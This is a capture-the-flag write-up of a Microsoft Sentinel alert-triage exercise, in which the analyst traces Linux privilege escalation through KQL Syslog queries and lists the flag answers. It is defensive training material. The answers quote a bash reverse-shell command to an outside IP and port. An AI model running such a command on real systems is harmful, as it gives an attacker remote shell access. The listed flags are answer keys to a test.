# SOC Alert Triaging - Tinsel Triage

## Challenge Overview
This challenge places the analyst in a simulated SOC environment where Microsoft Sentinel is actively generating multiple alerts across an Azure tenant.
The scenario revolves around a suspected coordinated attack attributed to the “Evil Bunnies,” resulting in a surge of alerts related to Linux privilege escalation, authentication abuse, and persistence mechanisms. 
The objective is to triage incoming alerts efficiently, identify which ones represent real threats, correlate related incidents, and validate attacker activity through log analysis.
By navigating Sentinel incidents, drilling into alert evidence, and querying raw Syslog data using KQL, the analyst must reconstruct the attacker’s actions and extract key indicators from the environment.

## Learnings
From this challenge, I learned:
- The importance of structured alert triaging in a SOC environment
- Why alerts should be prioritised by severity, timing, attack stage, and affected assets, not treated equally
- Hands-on experience with Microsoft Sentinel’s investigation workflow, including:
  - Incident and alert views
  - Evidence and entity analysis
  - Raw log investigation using KQL

## My Solve 
I began by accessing Microsoft Sentinel and navigating to the Incidents view to review the active alerts. From the dashboard, I observed multiple open incidents, 
with several marked as High severity, indicating potential privilege escalation or system compromise. Following standard triage practice, I prioritised high-severity alerts first,
starting with `Linux PrivEsc – Polkit Exploit Attempt`, where Sentinel showed that `10` entities were affected, suggesting widespread or repeated exploitation attempts.
I then reviewed related high-severity incidents such as `Linux PrivEsc – Sudo Shadow Access` and `Linux PrivEsc – User Added to Sudo Group`, confirming their severity and scope, including the addition of four accounts to the sudoers group.
<br/>
<img width="1920" height="1070" alt="Screenshot 2025-12-22 193308" src="https://github.com/user-attachments/assets/6793917b-9b9f-4523-84d0-5006deabeb11" />
<br/>
<img width="1920" height="1066" alt="Screenshot 2025-12-22 193430" src="https://github.com/user-attachments/assets/bed33ae2-1989-4ce3-9513-7b1b6232912a" />
<br/>
<img width="1920" height="1057" alt="Screenshot 2025-12-22 193558" src="https://github.com/user-attachments/assets/9742178e-2d00-4562-9f27-73670c8cfa48" />
<br/>
After identifying related alerts, I moved into Advanced Hunting and queried the Syslog_CL table using KQL, filtering(and modifying) by specific hosts such as `app-02`, `websrv-01`, `storage-01`, and `app-01`. 
The logs showed clear signs of malicious behaviour, including the insertion of the kernel module `malicious_mod.ko`, suspicious commands executed by compromised users, and privilege escalation actions like modifying /etc/shadow and adding users to sudoers.
<br/>
<br/>
> **setting host_s to websrv-01 :**
<br/>
<br/>
<img width="1920" height="1066" alt="Screenshot 2025-12-22 194107" src="https://github.com/user-attachments/assets/c9089e72-5383-413b-8e37-a3b0b4a8d2db" />
<br/>
<br/>
>**setting host_s to storage-01 :**
<br/>
<br/>
<img width="1920" height="1074" alt="Screenshot 2025-12-22 195301" src="https://github.com/user-attachments/assets/c04272c4-3abb-4e49-a008-ad7cf4879cef" />
<br/>
<br/>
>**setting host_s to app-01 :**
<br/>
<br/>
<img width="1920" height="1059" alt="Screenshot 2025-12-22 195414" src="https://github.com/user-attachments/assets/362d8a15-264d-4a76-9b2d-9cb71ab30a48" />


## Flag / Answers
- Entities affected by Linux PrivEsc – Polkit Exploit Attempt: **10**
- Severity of Linux PrivEsc – Sudo Shadow Access: **High**
- Accounts added to sudoers group: **4**
- Kernel module installed in websrv-01: **malicious_mod.ko**
- Unusual command executed on websrv-01: **/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1**
- Source IP of first successful SSH login to storage-01: **172.16.0.12**
- External IP that logged in as root to app-01: **203.0.113.45**
- Additional user added to sudoers group on app-01: **deploy**
